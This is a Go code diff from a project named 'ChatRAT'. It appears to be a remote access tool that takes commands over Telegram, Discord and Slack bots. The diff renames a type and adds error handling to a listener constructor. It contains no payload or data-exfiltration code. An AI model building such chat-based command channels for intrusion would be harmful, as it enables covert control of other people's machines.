@@ -6,7 +6,7 @@ import (
 	"github.com/cyb3rjerry/ChatRAT/pkg/listeners/telegram"
 )
 
-type CommType int64
+type ListenerType int64
 
 type ListenerConfig interface {
 	telegram.TelegramConfig | discord.DiscordConfig | slack.SlackConfig
@@ -19,14 +19,24 @@ type Listener interface {
 	ReceiveMedia()
 }
 
-func NewListener[T ListenerConfig](config T) Listener {
+func NewListener[T ListenerConfig](config T) (Listener, error) {
 	switch config := any(config).(type) { // https://github.com/golang/go/issues/49206
 	case telegram.TelegramConfig:
-		return telegram.NewConn(config)
+		bot, err := telegram.NewConn(config)
+		if err != nil {
+			return nil, err
+		}
+		return bot, nil
 	case discord.DiscordConfig:
-		return discord.NewConn(config)
+		bot, err := discord.NewConn(config)
+		if err != nil {
+			return nil, err
+		}
+		return bot, nil
 	case slack.SlackConfig:
 		return slack.NewConn(config)
+	default:
+		// Should never reach as the config argument is constrained
+		panic("Unknown listener type")
 	}
-	return nil
 }
